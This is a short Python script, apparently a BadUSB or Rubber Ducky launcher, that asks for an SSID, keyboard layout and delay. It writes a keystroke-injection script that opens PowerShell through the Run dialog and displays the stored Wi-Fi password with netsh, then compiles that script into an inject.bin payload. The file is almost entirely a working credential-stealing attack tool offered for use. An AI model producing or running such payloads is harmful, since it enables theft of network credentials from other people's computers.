

from pyfiglet import Figlet
import os


f = Figlet(font='slant')
print (f.renderText('RD - Launcher'))

questions = True
while questions:
    print("""
[ 1 ] Create wifi password extractor
[ 2 ] Exit
    """)

    questions = input("Select your choise: ")
    if questions == "1":
        ssid = input("Enter SSID: ")
        language = input("Enter language keyboard: ")
        delay = input("Enter Delay initial(ms): ")
        file = open("wifi.txt", "w")
        file.write("DELAY " + delay + "\n")
        file.write("GUI r\n")
        file.write("DELAY 1000\n")
        file.write("STRING powershell\n")
        file.write("ENTER\n")
        file.write("DELAY 2000\n")
        file.write("STRING netsh.exe wlan show profile name=" + ssid + " key=clear\n")
        file.write("ENTER")
        file.close()
        os.system(f"java -jar encoder/encoder.jar -i wifi.txt -o inject.bin -l {language}\n")
        print("File create: inject.bin")
        break
    elif questions == "2":
        print('Stop program!!!')
        break
